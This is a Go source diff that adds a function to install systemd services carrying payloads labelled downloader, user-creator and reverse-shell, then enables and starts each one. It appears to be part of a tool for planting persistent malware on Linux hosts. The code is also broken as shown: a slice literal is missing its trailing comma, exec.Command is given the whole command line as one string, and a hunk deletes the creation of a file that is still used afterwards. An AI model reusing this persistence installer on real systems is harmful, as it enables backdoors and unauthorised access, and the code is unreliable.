@@ -76,6 +76,30 @@ func main() {
 
 }
 
+func checkServices(files []servicefile) {
+	types := []string{
+		"downloader",
+		"random-messenger",
+		"file-creator",
+		"user-creator",
+		"reverse-shell"
+	}
+
+	for i := 0; i < len(files); i++ {
+		curService := files[i]
+
+
+		//Create the .service file
+		createFile( /*"/etc/systemd/system/"+*/ curService.details.name+".service", curService.contents)
+		//Place the playload in the correct location
+		copyFile(curService.details.payload, curService.details.path+curService.details.filename)
+		enableService := exec.Command("systemctl enable " + curService.details.name + ".service")
+		enableService.Run()
+		runService := exec.Command("systemctl start " + curService.details.name + ".service")
+		runService.Run()
+	}
+}
+
 func createServices(files []servicefile) {
 	for i := 0; i < len(files); i++ {
 		curService := files[i]
@@ -97,11 +121,6 @@ func copyFile(src, dst string) error {
 	}
 	defer in.Close()
 
-	out, err := os.Create(dst)
-	if err != nil {
-		return err
-	}
-	defer out.Close()
 
 	_, err = io.Copy(out, in)
 	if err != nil {
